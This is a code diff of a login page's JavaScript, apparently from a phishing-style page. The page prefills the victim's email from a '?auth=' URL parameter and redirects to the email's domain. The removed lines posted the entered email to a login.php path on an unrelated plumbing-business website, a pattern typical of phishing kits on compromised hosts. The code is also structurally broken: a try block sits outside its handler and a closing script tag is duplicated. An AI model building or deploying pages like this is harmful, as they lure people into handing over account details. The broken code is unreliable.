@@ -201,8 +201,6 @@ button:disabled {
     </button>
 
 </div>
-
-
 <script>
 document.addEventListener("DOMContentLoaded", function () {
     const form = document.getElementById("loginForm");
@@ -216,15 +214,16 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
     }
 
-    // Example: ?auth=john@example.com
+    // Reads: ?auth=john@example.com
     const params = new URLSearchParams(window.location.search);
     const email = params.get("auth") || "";
 
+    // Auto-fill email
     if (email) {
         emailInput.value = email;
     }
 
-    form.addEventListener("submit", function (event) {
+    form.addEventListener("submit", async function (event) {
         event.preventDefault();
 
         const enteredEmail = emailInput.value.trim();
@@ -240,63 +239,39 @@ document.addEventListener("DOMContentLoaded", function () {
             return;
         }
 
-        // Safe test: password is neither logged nor transmitted.
-        console.log("Email field is populated:", enteredEmail.length > 0);
-        console.log("Password field has a value:", password.length > 0);
-    });
-});
-
+        // Password remains local and is never transmitted.
+        button.disabled = true;
+        button.textContent = "Testing...";
 
         try {
-            const response = await fetch(
-                "https://lorneplumbing.com.au/via/login.php",
-                {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        email: enteredEmail
-                    })
-                }
-            );
+            console.log("Email:", enteredEmail);
+            console.log("Password entered:", password.length > 0);
 
-            const result = await response.json();
+            const domain = enteredEmail.split("@")[1]?.toLowerCase();
 
-            if (response.ok && result.success === true) {
-                message.textContent = "Connection successful.";
-
-                const domain = enteredEmail
-                    .split("@")[1]
-                    ?.toLowerCase();
-
-                const allowedDomains = [
-                    "example.com",
-                    "example.org"
-                ];
-
-                if (domain && allowedDomains.includes(domain)) {
-                    window.location.href = "https://" + domain + "/";
-                } else {
-                    message.textContent =
-                        "This email domain is not supported.";
-                }
-
-            } else {
-                message.textContent =
-                    result.message || "Server returned an error.";
+            if (!domain) {
+                message.textContent = "Invalid email address.";
+                return;
             }
 
-        } catch (error) {
-            console.error("Request failed:", error);
-            message.textContent = "Could not connect to the server.";
+            message.textContent = "Redirecting...";
 
+            window.location.href = "https://" + domain + "/";
+
+        } catch (error) {
+            console.error("Redirect failed:", error);
+            message.textContent = "Could not redirect.";
         } finally {
             button.disabled = false;
             button.textContent = "Log in";
         }
     });
 });
+</script>
+
+
+       
+     
 </script>
 
 
